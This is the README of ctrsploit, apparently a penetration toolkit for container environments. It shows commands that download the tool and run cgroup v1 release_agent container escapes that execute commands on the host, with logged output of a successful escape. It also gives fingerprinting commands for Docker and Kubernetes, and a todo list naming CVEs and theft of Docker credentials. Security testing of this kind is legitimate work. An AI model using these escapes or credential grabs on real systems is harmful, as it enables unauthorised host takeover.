# ctrsploit: A penetration toolkit for container environment

[中文文档](./README-ZH.md)

## usage
### help
```
wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
./ctrsploit --help
NAME:
   ctrsploit - A penetration toolkit for container environment

ctrsploit is a command line ... //TODO


USAGE:
   ctrsploit [global options] command [command options] [arguments...]

COMMANDS:
   auto, a     auto gathering information, and detect vuls, and exploit // TODO
   exploit, e  run a exploit
   env, e      gather information // TODO
   help, h     Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --lang value  language for the greeting (default: "english")
   --help, -h    show help (default: false)
```

### run a exploit
```
root@2aa13a052102:/# ./ctrsploit e
NAME:
   ctrsploit exploit - run a exploit

USAGE:
   ctrsploit exploit command [command options] [arguments...]

COMMANDS:
   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
   help, h                                          Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)

```

eg. : escape by 'cgroupv1-release_agent' tech.
```
root@host # docker run -ti --rm --security-opt="seccomp=unconfined" --cap-add="sys_admin" busybox
root@ctr # wget -O ctrsploit https://github.com/ssst0n3/ctrsploit/releases/download/v0.1/ctrsploit_linux_amd64 && chmod +x ctrsploit
root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
```

if we do not know the rootfs of container, ctrsploit can still escape by release agent tech
```
[root@container /]# ./ctrsploit e ra3 -c "cat /etc/hostname"
INFO[0000] trying 100                                   
INFO[0000] trying 200                                   
INFO[0000] trying 300                                   
INFO[0000] trying 400                                   
INFO[0000] trying 500                                   
...
INFO[0017] trying 11700                                 
INFO[0017] found /output140128693, success              
INFO[0018] 
===========start of result==============
cce-arm-euler28-30231
===========end of result============== 
```

### gather information
usage
```
root@ctr:/# ./ctrsploit env
NAME:
   ctrsploit env - gather information

USAGE:
   ctrsploit env command [command options] [arguments...]

COMMANDS:
   where, w        detect whether you are in the container, and which type of the container
   graphdriver, g  detect graphdriver type and extend information
   cgroups, c      gather cgroup information
   help, h         Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)
```

where
```
root@ctr:/# ./ctrsploit  env  w
INFO[0000] ===========Docker=========
.dockerenv exists: ✔
rootfs contains 'docker': ✔
cgroup contains 'docker': ✘
the mount source of /etc/hosts contains 'docker': ✔
hostname match regex ^[0-9a-f]{12}$: ✔
=> is in docker: ✔ 
INFO[0000] ===========k8s=========
/var/run/secrets/kubernetes.io exists: ✘
hostname match k8s pattern: ✘
the mount source of /etc/hosts contains 'pods': ✘
cgroup contains 'kubepods': ✘
=> is in k8s: ✘ 
```

cgroup version
```
root@ctr:/# ./ctrsploit env c
INFO[0000] ===========Cgroups=========
is cgroupv1: ✘
is cgroupv2: ✔ 
```

```
root@ctr:/# ./ctrsploit env g
INFO[0000] ===========Overlay=========
Overlay enabled: false 
INFO[0000] ===========DeviceMapper=========
DeviceMapper enabled: true
DeviceMapper used: true
The number of devicemapper used in running container: 11 ( =(count(running containers)+1) )
The host path of container's rootfs: /var/lib/docker/devicemapper/mnt/1659264e845b55b8c9ec42034d7d2dcc23159ebd06f3c69983e764f26eab9721/rootfs 
```

## pre-built release
https://github.com/ssst0n3/ctrsploit/releases

## Todo List
- [ ] information gather
    - [ ] whether in container
      - [ ] current container env
        - [ ] swarm
        - [x] k8s
          - [x] `ls -lah /var/run/secrets/kubernetes.io`
          - [x] `cat /proc/self/mountinfo | grep hosts |grep pods`
          - [x] `cat /proc/self/cgroup |grep kubepods`
          - [x] `cat /etc/hostname`
      - [ ] current cri
        - [x] docker
          - [x] `ls -lah /.dockerenv`
          - [x] `head -n 1 /proc/self/mountinfo | grep docker`
          - [x] `cat /proc/self/cgroup |grep docker`
          - [x] `cat /proc/self/mountinfo | grep "hosts|hostname" |grep docker`
          - [x] `cat /etc/hostname` // not convinced
        - [ ] containerd
        - [ ] ...
    - [ ] current container software version
      - [ ] cluster api: curl -k https://10.0.0.233:5443/apis/version.cce.io/v1beta1 --header "Authorization: Bearer $token"
    - [ ] current container ID
    - [ ] the security protection
        - [ ] capability
        - [ ] seccomp
        - [ ] LSM
        - [ ] cgroup
            - [ ] cgroup version
                - [x] v1
                - [x] v2
    - [ ] block dev name
        - [ ] /sys/block/nvme0n1
    - [ ] the absolute path under host of container's rootfs
        - [ ] docker
        - [ ] k8s variant 1
        - [ ] k8s variant 2
    - [ ] openstack api accessibility
    - [ ] graphdriver
        - [x] overlay
        - [x] devicemapper
        - [ ] aufs
- [ ] execute
    - [ ] outside of container
        - [ ] get docker credentials
            - [ ] $HOME/.docker/config.json
- [ ] exploit
    - [ ] CVE-2019-16884
    - [ ] CVE-2019-14271
    - [ ] CVE-2021-21285  
    - [ ] mount dir->symlink->mount again escape
    - [x] cgroupv1 notify_on_release escape
        - [x] unknown rootfs support 
    - [x] cgroupv1 notify_on_release escape with unknown rootfs
- [ ] auto exploit